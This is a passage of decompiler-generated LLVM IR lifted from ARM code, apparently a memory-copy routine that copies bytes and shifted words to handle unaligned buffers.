  %v2_15244 = load i8*, i8** %stack_var_-8, align 4
  %v3_15244 = ptrtoint i8* %v2_15244 to i32
  store i32 %v3_15244, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1518c)
  %v0_1524c.pre = load i32, i32* @ip, align 4
  %v0_15254.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_15258.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %dec_label_pc_15198, %.thread126
  %v2_15258 = phi i32 [ %v1_15180, %dec_label_pc_15198 ], [ %v2_15258.pre, %.thread126 ]
  %v0_15254 = phi i32 [ %v0_15180, %dec_label_pc_15198 ], [ %v0_15254.pre, %.thread126 ]
  %v0_1524c = phi i32 [ %v1_15198, %dec_label_pc_15198 ], [ %v0_1524c.pre, %.thread126 ]
  %v1_1524c = sub i32 4, %v0_1524c
  store i32 %v1_1524c, i32* @ip, align 4
  %v1_15250 = add i32 %v1_1524c, -2
  %v3_15250 = sub i32 1, %v1_1524c
  %v4_15250 = and i32 %v3_15250, %v1_1524c
  %v5_15250 = icmp slt i32 %v4_15250, 0
  store i1 %v5_15250, i1* %cpsr_v.global-to-local, align 1
  %v6_15250 = icmp slt i32 %v1_15250, 0
  store i1 %v6_15250, i1* %cpsr_n.global-to-local, align 1
  %v7_15250 = icmp eq i32 %v1_1524c, 2
  store i1 %v7_15250, i1* %cpsr_z.global-to-local, align 1
  %v1_15254 = inttoptr i32 %v0_15254 to i8*
  %v2_15254 = load i8, i8* %v1_15254, align 1
  %v3_15254 = zext i8 %v2_15254 to i32
  store i32 %v3_15254, i32* @r3, align 4
  %v5_15254 = add i32 %v0_15254, 1
  store i32 %v5_15254, i32* @r1, align 4
  %v3_15258 = inttoptr i32 %v2_15258 to i8*
  store i8 %v2_15254, i8* %v3_15258, align 1
  %v4_15258 = load i32, i32* @r0, align 4
  %v5_15258 = add i32 %v4_15258, 1
  store i32 %v5_15258, i32* @r0, align 4
  %v0_1525c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1525c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1525c = xor i1 %v0_1525c, %v1_1525c
  br i1 %v2_1525c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1524c
  %v3_1525c = load i32, i32* @r1, align 4
  %v4_1525c = inttoptr i32 %v3_1525c to i8*
  %v5_1525c = load i8, i8* %v4_1525c, align 1
  %v6_1525c = zext i8 %v5_1525c to i32
  store i32 %v6_1525c, i32* @r3, align 4
  %v8_1525c = add i32 %v3_1525c, 1
  store i32 %v8_1525c, i32* @r1, align 4
  %v6_15260 = inttoptr i32 %v5_15258 to i8*
  store i8 %v5_1525c, i8* %v6_15260, align 1
  %v7_15260 = load i32, i32* @r0, align 4
  %v8_15260 = add i32 %v7_15260, 1
  store i32 %v8_15260, i32* @r0, align 4
  %v1_15264.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15264.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1524c, %bb145
  %v7_15268 = phi i32 [ %v8_15260, %bb145 ], [ %v5_15258, %dec_label_pc_1524c ]
  %v2_15268 = phi i1 [ %v2_15264.pre, %bb145 ], [ %v1_1525c, %dec_label_pc_1524c ]
  %v1_15268 = phi i1 [ %v1_15264.pre, %bb145 ], [ %v0_1525c, %dec_label_pc_1524c ]
  %v0_15264 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15264 = xor i1 %v2_15268, %v1_15268
  %v4_15264 = or i1 %v0_15264, %v3_15264
  br i1 %v4_15264, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_15264 = load i32, i32* @r1, align 4
  %v6_15264 = inttoptr i32 %v5_15264 to i8*
  %v7_15264 = load i8, i8* %v6_15264, align 1
  %v8_15264 = zext i8 %v7_15264 to i32
  store i32 %v8_15264, i32* @r3, align 4
  %v10_15264 = add i32 %v5_15264, 1
  store i32 %v10_15264, i32* @r1, align 4
  %v8_15268 = inttoptr i32 %v7_15268 to i8*
  store i8 %v7_15264, i8* %v8_15268, align 1
  %v9_15268 = load i32, i32* @r0, align 4
  %v10_15268 = add i32 %v9_15268, 1
  store i32 %v10_15268, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1539c77 = phi i32 [ %v10_15268, %bb146 ], [ %v7_15268, %.thread127 ]
  %v0_1526c = load i32, i32* %r2.global-to-local, align 4
  %v1_1526c = load i32, i32* @ip, align 4
  %v2_1526c = sub i32 %v0_1526c, %v1_1526c
  store i32 %v2_1526c, i32* %r2.global-to-local, align 4
  %v4_1526c = xor i32 %v1_1526c, %v0_1526c
  %v5_1526c = xor i32 %v2_1526c, %v0_1526c
  %v6_1526c = and i32 %v5_1526c, %v4_1526c
  %v7_1526c = icmp slt i32 %v6_1526c, 0
  store i1 %v7_1526c, i1* %cpsr_v.global-to-local, align 1
  %v8_1526c = icmp slt i32 %v2_1526c, 0
  store i1 %v8_1526c, i1* %cpsr_n.global-to-local, align 1
  %v9_1526c = icmp eq i32 %v0_1526c, %v1_1526c
  store i1 %v9_1526c, i1* %cpsr_z.global-to-local, align 1
  %v2_15270 = xor i1 %v8_1526c, %v7_1526c
  br i1 %v2_15270, label %bb140, label %dec_label_pc_15274

dec_label_pc_15274:                               ; preds = %.thread128
  %v0_15274 = load i32, i32* @r1, align 4
  %v1_15274 = urem i32 %v0_15274, 4
  store i32 %v1_15274, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15274 = icmp eq i32 %v1_15274, 0
  store i1 %v2_15274, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_15274 to i2
  br i1 %v2_15274, label %dec_label_pc_151a8, label %dec_label_pc_1527c

dec_label_pc_1527c:                               ; preds = %dec_label_pc_151a0, %dec_label_pc_15274
  %v0_1539c76 = phi i32 [ %v1_15180, %dec_label_pc_151a0 ], [ %v0_1539c77, %dec_label_pc_15274 ]
  %v0_15304 = phi i32 [ %v2_15190, %dec_label_pc_151a0 ], [ %v2_1526c, %dec_label_pc_15274 ]
  %v0_15284.off0 = phi i2 [ %extract.t, %dec_label_pc_151a0 ], [ %extract.t131, %dec_label_pc_15274 ]
  %v0_1527c = phi i32 [ %v0_15180, %dec_label_pc_151a0 ], [ %v0_15274, %dec_label_pc_15274 ]
  %v1_1527c = and i32 %v0_1527c, -4
  store i32 %v1_1527c, i32* %r1.global-to-local, align 4
  %v1_15280 = inttoptr i32 %v1_1527c to i32*
  %v2_15280 = load i32, i32* %v1_15280, align 4
  store i32 %v2_15280, i32* %lr.global-to-local, align 4
  %v4_15280 = add i32 %v1_1527c, 4
  store i32 %v4_15280, i32* %r1.global-to-local, align 4
  %v1_152fc = add i32 %v0_15304, -12
  %v3_152fc = sub i32 11, %v0_15304
  %v4_152fc = and i32 %v3_152fc, %v0_15304
  %v5_152fc = icmp slt i32 %v4_152fc, 0
  store i1 %v5_152fc, i1* %cpsr_v.global-to-local, align 1
  %v6_152fc = icmp slt i32 %v1_152fc, 0
  store i1 %v6_152fc, i1* %cpsr_n.global-to-local, align 1
  %v7_152fc = icmp eq i32 %v0_15304, 12
  store i1 %v7_152fc, i1* %cpsr_z.global-to-local, align 1
  %v2_15300 = xor i1 %v6_152fc, %v5_152fc
  switch i2 %v0_15284.off0, label %dec_label_pc_15290 [
    i2 -1, label %dec_label_pc_15368
    i2 -2, label %dec_label_pc_152fc
  ]

dec_label_pc_15290:                               ; preds = %dec_label_pc_1527c
  br i1 %v2_15300, label %dec_label_pc_152dc, label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %dec_label_pc_15290
  store i32 %v1_152fc, i32* %r2.global-to-local, align 4
  %v3_1529c = load i32, i32* @r4, align 4
  store i32 %v3_1529c, i32* %stack_var_-16, align 4
  %v6_1529c = load i32, i32* @r5, align 4
  store i32 %v6_1529c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_152a0

dec_label_pc_152a0:                               ; preds = %dec_label_pc_152a0.dec_label_pc_152a0_crit_edge, %dec_label_pc_15298
  %v0_152c4 = phi i32 [ %v12_152c4, %dec_label_pc_152a0.dec_label_pc_152a0_crit_edge ], [ %v0_1539c76, %dec_label_pc_15298 ]
  %v0_152a4 = phi i32 [ %v0_152a4.pre, %dec_label_pc_152a0.dec_label_pc_152a0_crit_edge ], [ %v4_15280, %dec_label_pc_15298 ]
  %v0_152a0 = phi i32 [ %v0_152a0.pre, %dec_label_pc_152a0.dec_label_pc_152a0_crit_edge ], [ %v2_15280, %dec_label_pc_15298 ]
  %v3_152a0 = udiv i32 %v0_152a0, 256
  %v1_152a4 = inttoptr i32 %v0_152a4 to i32*
  %v2_152a4 = load i32, i32* %v1_152a4, align 4
  store i32 %v2_152a4, i32* %r4.global-to-local, align 4
  %v3_152a4 = add i32 %v0_152a4, 4
  %v4_152a4 = inttoptr i32 %v3_152a4 to i32*
  %v5_152a4 = load i32, i32* %v4_152a4, align 4
  store i32 %v5_152a4, i32* %r5.global-to-local, align 4
  %v6_152a4 = add i32 %v0_152a4, 8
  %v7_152a4 = inttoptr i32 %v6_152a4 to i32*
  %v8_152a4 = load i32, i32* %v7_152a4, align 4
  store i32 %v8_152a4, i32* %ip.global-to-local, align 4
  %v9_152a4 = add i32 %v0_152a4, 12
  %v10_152a4 = inttoptr i32 %v9_152a4 to i32*
  %v11_152a4 = load i32, i32* %v10_152a4, align 4
  store i32 %v11_152a4, i32* %lr.global-to-local, align 4
  %v12_152a4 = add i32 %v0_152a4, 16
  store i32 %v12_152a4, i32* %r1.global-to-local, align 4
  %v4_152a8 = mul i32 %v2_152a4, 16777216
  %v5_152a8 = or i32 %v4_152a8, %v3_152a0
  store i32 %v5_152a8, i32* @r3, align 4
  %v3_152ac = udiv i32 %v2_152a4, 256
  %v4_152b0 = mul i32 %v5_152a4, 16777216
  %v5_152b0 = or i32 %v4_152b0, %v3_152ac
  store i32 %v5_152b0, i32* %r4.global-to-local, align 4
  %v3_152b4 = udiv i32 %v5_152a4, 256
  %v4_152b8 = mul i32 %v8_152a4, 16777216
  %v5_152b8 = or i32 %v4_152b8, %v3_152b4
  store i32 %v5_152b8, i32* %r5.global-to-local, align 4
  %v3_152bc = udiv i32 %v8_152a4, 256
  %v4_152c0 = mul i32 %v11_152a4, 16777216
  %v5_152c0 = or i32 %v4_152c0, %v3_152bc
  store i32 %v5_152c0, i32* @ip, align 4
  %v1_152c4 = inttoptr i32 %v0_152c4 to i32*
  store i32 %v5_152a8, i32* %v1_152c4, align 4
  %v3_152c4 = add i32 %v0_152c4, 4
  %v4_152c4 = inttoptr i32 %v3_152c4 to i32*
  %v5_152c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_152c4, i32* %v4_152c4, align 4
  %v6_152c4 = add i32 %v0_152c4, 8
  %v7_152c4 = inttoptr i32 %v6_152c4 to i32*
  %v8_152c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_152c4, i32* %v7_152c4, align 4
  %v9_152c4 = add i32 %v0_152c4, 12
  %v10_152c4 = inttoptr i32 %v9_152c4 to i32*
  %v11_152c4 = load i32, i32* @ip, align 4
  store i32 %v11_152c4, i32* %v10_152c4, align 4
  %v12_152c4 = add i32 %v0_152c4, 16
  store i32 %v12_152c4, i32* @r0, align 4
  %v0_152c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_152c8 = add i32 %v0_152c8, -16
  store i32 %v1_152c8, i32* %r2.global-to-local, align 4
  %v3_152c8 = sub i32 15, %v0_152c8
  %v4_152c8 = and i32 %v3_152c8, %v0_152c8
  %v5_152c8 = icmp slt i32 %v4_152c8, 0
  %v6_152c8 = icmp slt i32 %v1_152c8, 0
  %v2_152cc = xor i1 %v6_152c8, %v5_152c8
  br i1 %v2_152cc, label %dec_label_pc_152d0, label %dec_label_pc_152a0.dec_label_pc_152a0_crit_edge

dec_label_pc_152a0.dec_label_pc_152a0_crit_edge:  ; preds = %dec_label_pc_152a0
  %v0_152a0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_152a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_152a0

dec_label_pc_152d0:                               ; preds = %dec_label_pc_152a0
  %v2_152d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_152d0, i32* @r4, align 4
  %v5_152d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_152d0, i32* @r5, align 4
  %v1_152d4 = add i32 %v0_152c8, -4
  store i32 %v1_152d4, i32* %r2.global-to-local, align 4
  %v3_152d4 = add i32 %v0_152c8, 2147483632
  %v4_152d4 = and i32 %v1_152d4, %v3_152d4
  %v5_152d4 = icmp slt i32 %v4_152d4, 0
  store i1 %v5_152d4, i1* %cpsr_v.global-to-local, align 1
  %v6_152d4 = icmp slt i32 %v1_152d4, 0
  store i1 %v6_152d4, i1* %cpsr_n.global-to-local, align 1
  %v7_152d4 = icmp eq i32 %v1_152d4, 0
  store i1 %v7_152d4, i1* %cpsr_z.global-to-local, align 1
  %v2_152d8 = xor i1 %v6_152d4, %v5_152d4
  br i1 %v2_152d8, label %dec_label_pc_152f4, label %dec_label_pc_152dc

dec_label_pc_152dc:                               ; preds = %dec_label_pc_152d0, %dec_label_pc_15290, %dec_label_pc_152dc
  %v1_152e8 = phi i32 [ %v4_152e8, %dec_label_pc_152dc ], [ %v12_152c4, %dec_label_pc_152d0 ], [ %v0_1539c76, %dec_label_pc_15290 ]
  %v0_152dc = load i32, i32* %lr.global-to-local, align 4
  %v3_152dc = udiv i32 %v0_152dc, 256
  store i32 %v3_152dc, i32* %ip.global-to-local, align 4
  %v0_152e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_152e0 = inttoptr i32 %v0_152e0 to i32*
  %v2_152e0 = load i32, i32* %v1_152e0, align 4
  store i32 %v2_152e0, i32* %lr.global-to-local, align 4
  %v4_152e0 = add i32 %v0_152e0, 4
  store i32 %v4_152e0, i32* %r1.global-to-local, align 4
  %v4_152e4 = mul i32 %v2_152e0, 16777216
  %v5_152e4 = or i32 %v4_152e4, %v3_152dc
  store i32 %v5_152e4, i32* @ip, align 4
  %v2_152e8 = inttoptr i32 %v1_152e8 to i32*
  store i32 %v5_152e4, i32* %v2_152e8, align 4
  %v3_152e8 = load i32, i32* @r0, align 4
  %v4_152e8 = add i32 %v3_152e8, 4
  store i32 %v4_152e8, i32* @r0, align 4
  %v0_152ec = load i32, i32* %r2.global-to-local, align 4
  %v1_152ec = add i32 %v0_152ec, -4
  store i32 %v1_152ec, i32* %r2.global-to-local, align 4
  %v3_152ec = sub i32 3, %v0_152ec
  %v4_152ec = and i32 %v3_152ec, %v0_152ec
  %v5_152ec = icmp slt i32 %v4_152ec, 0
  %v6_152ec = icmp slt i32 %v1_152ec, 0
  %v2_152f0 = xor i1 %v6_152ec, %v5_152ec
  br i1 %v2_152f0, label %dec_label_pc_152f4.loopexit, label %dec_label_pc_152dc

dec_label_pc_152f4.loopexit:                      ; preds = %dec_label_pc_152dc
  %v7_152ec = icmp eq i32 %v0_152ec, 4
  store i1 %v5_152ec, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_152ec, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_152ec, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_152f4

dec_label_pc_152f4:                               ; preds = %dec_label_pc_152f4.loopexit, %dec_label_pc_152d0
  %v0_1521c59 = phi i32 [ %v1_152ec, %dec_label_pc_152f4.loopexit ], [ %v1_152d4, %dec_label_pc_152d0 ]
  %v0_152f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_152f4 = add i32 %v0_152f4, -3
  store i32 %v1_152f4, i32* @r1, align 4
  br label %bb140

dec_label_pc_152fc:                               ; preds = %dec_label_pc_1527c
  br i1 %v2_15300, label %dec_label_pc_15348, label %dec_label_pc_15304

dec_label_pc_15304:                               ; preds = %dec_label_pc_152fc
  store i32 %v1_152fc, i32* %r2.global-to-local, align 4
  %v3_15308 = load i32, i32* @r4, align 4
  store i32 %v3_15308, i32* %stack_var_-16, align 4
  %v6_15308 = load i32, i32* @r5, align 4
  store i32 %v6_15308, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1530c

dec_label_pc_1530c:                               ; preds = %dec_label_pc_1530c.dec_label_pc_1530c_crit_edge, %dec_label_pc_15304
  %v0_15330 = phi i32 [ %v12_15330, %dec_label_pc_1530c.dec_label_pc_1530c_crit_edge ], [ %v0_1539c76, %dec_label_pc_15304 ]
  %v0_15310 = phi i32 [ %v0_15310.pre, %dec_label_pc_1530c.dec_label_pc_1530c_crit_edge ], [ %v4_15280, %dec_label_pc_15304 ]
  %v0_1530c = phi i32 [ %v0_1530c.pre, %dec_label_pc_1530c.dec_label_pc_1530c_crit_edge ], [ %v2_15280, %dec_label_pc_15304 ]
  %v3_1530c = udiv i32 %v0_1530c, 65536
  %v1_15310 = inttoptr i32 %v0_15310 to i32*
  %v2_15310 = load i32, i32* %v1_15310, align 4
  store i32 %v2_15310, i32* %r4.global-to-local, align 4
  %v3_15310 = add i32 %v0_15310, 4
  %v4_15310 = inttoptr i32 %v3_15310 to i32*
  %v5_15310 = load i32, i32* %v4_15310, align 4
  store i32 %v5_15310, i32* %r5.global-to-local, align 4
  %v6_15310 = add i32 %v0_15310, 8
  %v7_15310 = inttoptr i32 %v6_15310 to i32*
  %v8_15310 = load i32, i32* %v7_15310, align 4
  store i32 %v8_15310, i32* %ip.global-to-local, align 4
  %v9_15310 = add i32 %v0_15310, 12
  %v10_15310 = inttoptr i32 %v9_15310 to i32*
  %v11_15310 = load i32, i32* %v10_15310, align 4
  store i32 %v11_15310, i32* %lr.global-to-local, align 4
  %v12_15310 = add i32 %v0_15310, 16
  store i32 %v12_15310, i32* %r1.global-to-local, align 4
  %v4_15314 = mul i32 %v2_15310, 65536
  %v5_15314 = or i32 %v4_15314, %v3_1530c
  store i32 %v5_15314, i32* @r3, align 4
  %v3_15318 = udiv i32 %v2_15310, 65536
  %v4_1531c = mul i32 %v5_15310, 65536
  %v5_1531c = or i32 %v4_1531c, %v3_15318
  store i32 %v5_1531c, i32* %r4.global-to-local, align 4
  %v3_15320 = udiv i32 %v5_15310, 65536
  %v4_15324 = mul i32 %v8_15310, 65536
  %v5_15324 = or i32 %v4_15324, %v3_15320
  store i32 %v5_15324, i32* %r5.global-to-local, align 4
  %v3_15328 = udiv i32 %v8_15310, 65536
  %v4_1532c = mul i32 %v11_15310, 65536
  %v5_1532c = or i32 %v4_1532c, %v3_15328
  store i32 %v5_1532c, i32* @ip, align 4
  %v1_15330 = inttoptr i32 %v0_15330 to i32*
  store i32 %v5_15314, i32* %v1_15330, align 4
  %v3_15330 = add i32 %v0_15330, 4
  %v4_15330 = inttoptr i32 %v3_15330 to i32*
  %v5_15330 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15330, i32* %v4_15330, align 4
  %v6_15330 = add i32 %v0_15330, 8
  %v7_15330 = inttoptr i32 %v6_15330 to i32*
  %v8_15330 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15330, i32* %v7_15330, align 4
  %v9_15330 = add i32 %v0_15330, 12
  %v10_15330 = inttoptr i32 %v9_15330 to i32*
  %v11_15330 = load i32, i32* @ip, align 4
  store i32 %v11_15330, i32* %v10_15330, align 4
  %v12_15330 = add i32 %v0_15330, 16
  store i32 %v12_15330, i32* @r0, align 4
  %v0_15334 = load i32, i32* %r2.global-to-local, align 4
  %v1_15334 = add i32 %v0_15334, -16
  store i32 %v1_15334, i32* %r2.global-to-local, align 4
  %v3_15334 = sub i32 15, %v0_15334
  %v4_15334 = and i32 %v3_15334, %v0_15334
  %v5_15334 = icmp slt i32 %v4_15334, 0
  %v6_15334 = icmp slt i32 %v1_15334, 0
  %v2_15338 = xor i1 %v6_15334, %v5_15334
  br i1 %v2_15338, label %dec_label_pc_1533c, label %dec_label_pc_1530c.dec_label_pc_1530c_crit_edge

dec_label_pc_1530c.dec_label_pc_1530c_crit_edge:  ; preds = %dec_label_pc_1530c
  %v0_1530c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15310.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1530c

dec_label_pc_1533c:                               ; preds = %dec_label_pc_1530c
  %v2_1533c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1533c, i32* @r4, align 4
  %v5_1533c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1533c, i32* @r5, align 4
  %v1_15340 = add i32 %v0_15334, -4
  store i32 %v1_15340, i32* %r2.global-to-local, align 4
  %v3_15340 = add i32 %v0_15334, 2147483632
  %v4_15340 = and i32 %v1_15340, %v3_15340
  %v5_15340 = icmp slt i32 %v4_15340, 0
  store i1 %v5_15340, i1* %cpsr_v.global-to-local, align 1
  %v6_15340 = icmp slt i32 %v1_15340, 0
  store i1 %v6_15340, i1* %cpsr_n.global-to-local, align 1
  %v7_15340 = icmp eq i32 %v1_15340, 0
  store i1 %v7_15340, i1* %cpsr_z.global-to-local, align 1
  %v2_15344 = xor i1 %v6_15340, %v5_15340
  br i1 %v2_15344, label %dec_label_pc_15360, label %dec_label_pc_15348

dec_label_pc_15348:                               ; preds = %dec_label_pc_1533c, %dec_label_pc_152fc, %dec_label_pc_15348
  %v1_15354 = phi i32 [ %v4_15354, %dec_label_pc_15348 ], [ %v12_15330, %dec_label_pc_1533c ], [ %v0_1539c76, %dec_label_pc_152fc ]
  %v0_15348 = load i32, i32* %lr.global-to-local, align 4
  %v3_15348 = udiv i32 %v0_15348, 65536
  store i32 %v3_15348, i32* %ip.global-to-local, align 4
  %v0_1534c = load i32, i32* %r1.global-to-local, align 4
  %v1_1534c = inttoptr i32 %v0_1534c to i32*
  %v2_1534c = load i32, i32* %v1_1534c, align 4
  store i32 %v2_1534c, i32* %lr.global-to-local, align 4
  %v4_1534c = add i32 %v0_1534c, 4
  store i32 %v4_1534c, i32* %r1.global-to-local, align 4
  %v4_15350 = mul i32 %v2_1534c, 65536
  %v5_15350 = or i32 %v4_15350, %v3_15348
  store i32 %v5_15350, i32* @ip, align 4
  %v2_15354 = inttoptr i32 %v1_15354 to i32*
  store i32 %v5_15350, i32* %v2_15354, align 4
  %v3_15354 = load i32, i32* @r0, align 4
  %v4_15354 = add i32 %v3_15354, 4
  store i32 %v4_15354, i32* @r0, align 4
  %v0_15358 = load i32, i32* %r2.global-to-local, align 4
  %v1_15358 = add i32 %v0_15358, -4
  store i32 %v1_15358, i32* %r2.global-to-local, align 4
  %v3_15358 = sub i32 3, %v0_15358
  %v4_15358 = and i32 %v3_15358, %v0_15358
  %v5_15358 = icmp slt i32 %v4_15358, 0
  %v6_15358 = icmp slt i32 %v1_15358, 0
  %v2_1535c = xor i1 %v6_15358, %v5_15358
  br i1 %v2_1535c, label %dec_label_pc_15360.loopexit, label %dec_label_pc_15348

dec_label_pc_15360.loopexit:                      ; preds = %dec_label_pc_15348
  %v7_15358 = icmp eq i32 %v0_15358, 4
  store i1 %v5_15358, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_15358, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15358, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15360

dec_label_pc_15360:                               ; preds = %dec_label_pc_15360.loopexit, %dec_label_pc_1533c
  %v0_1521c60 = phi i32 [ %v1_15358, %dec_label_pc_15360.loopexit ], [ %v1_15340, %dec_label_pc_1533c ]
  %v0_15360 = load i32, i32* %r1.global-to-local, align 4
  %v1_15360 = add i32 %v0_15360, -2
  store i32 %v1_15360, i32* @r1, align 4
  br label %bb140

dec_label_pc_15368:                               ; preds = %dec_label_pc_1527c
  br i1 %v2_15300, label %dec_label_pc_153b4, label %dec_label_pc_15370

dec_label_pc_15370:                               ; preds = %dec_label_pc_15368
  store i32 %v1_152fc, i32* %r2.global-to-local, align 4
  %v3_15374 = load i32, i32* @r4, align 4
  store i32 %v3_15374, i32* %stack_var_-16, align 4
  %v6_15374 = load i32, i32* @r5, align 4
  store i32 %v6_15374, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15378

dec_label_pc_15378:                               ; preds = %dec_label_pc_15378.dec_label_pc_15378_crit_edge, %dec_label_pc_15370
  %v0_1539c = phi i32 [ %v12_1539c, %dec_label_pc_15378.dec_label_pc_15378_crit_edge ], [ %v0_1539c76, %dec_label_pc_15370 ]
  %v0_1537c = phi i32 [ %v0_1537c.pre, %dec_label_pc_15378.dec_label_pc_15378_crit_edge ], [ %v4_15280, %dec_label_pc_15370 ]
  %v0_15378 = phi i32 [ %v0_15378.pre, %dec_label_pc_15378.dec_label_pc_15378_crit_edge ], [ %v2_15280, %dec_label_pc_15370 ]
  %v3_15378 = udiv i32 %v0_15378, 16777216
  %v1_1537c = inttoptr i32 %v0_1537c to i32*
  %v2_1537c = load i32, i32* %v1_1537c, align 4
  store i32 %v2_1537c, i32* %r4.global-to-local, align 4
  %v3_1537c = add i32 %v0_1537c, 4
  %v4_1537c = inttoptr i32 %v3_1537c to i32*
  %v5_1537c = load i32, i32* %v4_1537c, align 4
  store i32 %v5_1537c, i32* %r5.global-to-local, align 4
  %v6_1537c = add i32 %v0_1537c, 8
  %v7_1537c = inttoptr i32 %v6_1537c to i32*
  %v8_1537c = load i32, i32* %v7_1537c, align 4
  store i32 %v8_1537c, i32* %ip.global-to-local, align 4
  %v9_1537c = add i32 %v0_1537c, 12
  %v10_1537c = inttoptr i32 %v9_1537c to i32*
  %v11_1537c = load i32, i32* %v10_1537c, align 4
  store i32 %v11_1537c, i32* %lr.global-to-local, align 4
  %v12_1537c = add i32 %v0_1537c, 16
  store i32 %v12_1537c, i32* %r1.global-to-local, align 4
  %v4_15380 = mul i32 %v2_1537c, 256
  %v5_15380 = or i32 %v4_15380, %v3_15378
  store i32 %v5_15380, i32* @r3, align 4
  %v3_15384 = udiv i32 %v2_1537c, 16777216
  %v4_15388 = mul i32 %v5_1537c, 256
  %v5_15388 = or i32 %v4_15388, %v3_15384
  store i32 %v5_15388, i32* %r4.global-to-local, align 4
  %v3_1538c = udiv i32 %v5_1537c, 16777216
  %v4_15390 = mul i32 %v8_1537c, 256
  %v5_15390 = or i32 %v4_15390, %v3_1538c
  store i32 %v5_15390, i32* %r5.global-to-local, align 4
  %v3_15394 = udiv i32 %v8_1537c, 16777216
  %v4_15398 = mul i32 %v11_1537c, 256
  %v5_15398 = or i32 %v4_15398, %v3_15394
  store i32 %v5_15398, i32* @ip, align 4
  %v1_1539c = inttoptr i32 %v0_1539c to i32*
  store i32 %v5_15380, i32* %v1_1539c, align 4
  %v3_1539c = add i32 %v0_1539c, 4
  %v4_1539c = inttoptr i32 %v3_1539c to i32*
  %v5_1539c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1539c, i32* %v4_1539c, align 4
  %v6_1539c = add i32 %v0_1539c, 8
  %v7_1539c = inttoptr i32 %v6_1539c to i32*
  %v8_1539c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1539c, i32* %v7_1539c, align 4
  %v9_1539c = add i32 %v0_1539c, 12
  %v10_1539c = inttoptr i32 %v9_1539c to i32*
  %v11_1539c = load i32, i32* @ip, align 4
  store i32 %v11_1539c, i32* %v10_1539c, align 4
  %v12_1539c = add i32 %v0_1539c, 16
  store i32 %v12_1539c, i32* @r0, align 4
  %v0_153a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_153a0 = add i32 %v0_153a0, -16
  store i32 %v1_153a0, i32* %r2.global-to-local, align 4
  %v3_153a0 = sub i32 15, %v0_153a0
  %v4_153a0 = and i32 %v3_153a0, %v0_153a0
  %v5_153a0 = icmp slt i32 %v4_153a0, 0
  %v6_153a0 = icmp slt i32 %v1_153a0, 0
  %v2_153a4 = xor i1 %v6_153a0, %v5_153a0
  br i1 %v2_153a4, label %dec_label_pc_153a8, label %dec_label_pc_15378.dec_label_pc_15378_crit_edge

dec_label_pc_15378.dec_label_pc_15378_crit_edge:  ; preds = %dec_label_pc_15378
  %v0_15378.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1537c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15378

dec_label_pc_153a8:                               ; preds = %dec_label_pc_15378
  %v2_153a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_153a8, i32* @r4, align 4
  %v5_153a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_153a8, i32* @r5, align 4
  %v1_153ac = add i32 %v0_153a0, -4
  store i32 %v1_153ac, i32* %r2.global-to-local, align 4
  %v3_153ac = add i32 %v0_153a0, 2147483632
  %v4_153ac = and i32 %v1_153ac, %v3_153ac
  %v5_153ac = icmp slt i32 %v4_153ac, 0
  store i1 %v5_153ac, i1* %cpsr_v.global-to-local, align 1
  %v6_153ac = icmp slt i32 %v1_153ac, 0
  store i1 %v6_153ac, i1* %cpsr_n.global-to-local, align 1
  %v7_153ac = icmp eq i32 %v1_153ac, 0
  store i1 %v7_153ac, i1* %cpsr_z.global-to-local, align 1
  %v2_153b0 = xor i1 %v6_153ac, %v5_153ac
  br i1 %v2_153b0, label %dec_label_pc_153cc, label %dec_label_pc_153b4

dec_label_pc_153b4:                               ; preds = %dec_label_pc_153a8, %dec_label_pc_15368, %dec_label_pc_153b4
  %v1_153c0 = phi i32 [ %v4_153c0, %dec_label_pc_153b4 ], [ %v12_1539c, %dec_label_pc_153a8 ], [ %v0_1539c76, %dec_label_pc_15368 ]
  %v0_153b4 = load i32, i32* %lr.global-to-local, align 4
  %v3_153b4 = udiv i32 %v0_153b4, 16777216
  store i32 %v3_153b4, i32* %ip.global-to-local, align 4
